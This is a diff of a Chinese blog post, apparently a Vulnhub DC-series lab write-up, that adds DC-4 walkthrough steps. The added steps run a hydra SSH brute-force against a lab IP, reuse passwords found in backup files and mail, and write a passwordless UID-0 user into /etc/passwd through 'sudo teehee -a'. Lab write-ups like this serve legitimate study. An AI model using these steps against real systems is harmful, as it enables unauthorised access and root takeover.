@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="dc-1靶机安装 打开网址发现drupal,直接用之前的脚本打就行， 但是这里列出第二个方法，直接用msf好像更省事 进入msf 1search drupal   这里用第一个 1use 1  设置一下目标 ，run,进入shell cat flag1.txtEvery good CMS needs a config file - and so do you. 这是第一个flag,并提醒看f配">
+  <meta name="description" content="dc系列">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dc系列">
 <meta property="og:url" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/index.html">
 <meta property="og:site_name" content="not coder">
-<meta property="og:description" content="dc-1靶机安装 打开网址发现drupal,直接用之前的脚本打就行， 但是这里列出第二个方法，直接用msf好像更省事 进入msf 1search drupal   这里用第一个 1use 1  设置一下目标 ，run,进入shell cat flag1.txtEvery good CMS needs a config file - and so do you. 这是第一个flag,并提醒看f配">
+<meta property="og:description" content="dc系列">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625201250.png">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625210716.png">
@@ -38,8 +38,9 @@
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708194932.png">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708195019.png">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708204253.png">
+<meta property="og:image" content="http://example.com/2023/06/25/06/bugku/QQ%E6%88%AA%E5%9B%BE20230714151401.png">
 <meta property="article:published_time" content="2023-06-25T11:51:21.000Z">
-<meta property="article:modified_time" content="2023-07-08T15:27:12.780Z">
+<meta property="article:modified_time" content="2023-07-14T07:20:03.748Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
@@ -236,7 +237,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-08 23:27:12" itemprop="dateModified" datetime="2023-07-08T23:27:12+08:00">2023-07-08</time>
+                <time title="修改时间：2023-07-14 15:20:03" itemprop="dateModified" datetime="2023-07-14T15:20:03+08:00">2023-07-14</time>
               </span>
 
           <br>
@@ -245,14 +246,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
+              <span>5 分钟</span>
             </span>
 
         </div>
@@ -264,7 +265,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <span id="more"></span>
+        <p> dc系列</p>
+<span id="more"></span>
 
 <h2 id="dc-1"><a href="#dc-1" class="headerlink" title="dc-1"></a>dc-1</h2><p>靶机安装</p>
 <p>打开网址发现drupal,直接用之前的脚本打就行，</p>
@@ -419,6 +421,23 @@
 <p>切换终端</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
+<p>在jim 备份文件下发现密码</p>
+<p>ssh 爆破一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P 1.txt -I -t 64 ssh://192.168.158.163</span><br></pre></td></tr></table></figure>
+
+<p>解密为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jibril04</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l 发现用不了,查看mbox,发现邮箱提示，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/mail</span><br><span class="line">cat jim 发现charles 的密码</span><br></pre></td></tr></table></figure>
+
+<p>切换用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">参数解释</span><br><span class="line">#如：admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">&quot;-a&quot; 选项的作用等同于 &quot;&gt;&gt;&quot; 命令</span><br><span class="line">超级用户 UID=0 root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su admin 即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/../06/bugku/QQ%E6%88%AA%E5%9B%BE20230714151401.png"></p>
+<p>dc-5</p>
 
     </div>
 
@@ -538,7 +557,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -551,7 +570,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -587,12 +606,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">60k</span>
+    <span title="站点总字数">62k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:38</span>
+    <span title="站点阅读时长">3:44</span>
 </div>
 
 <!--
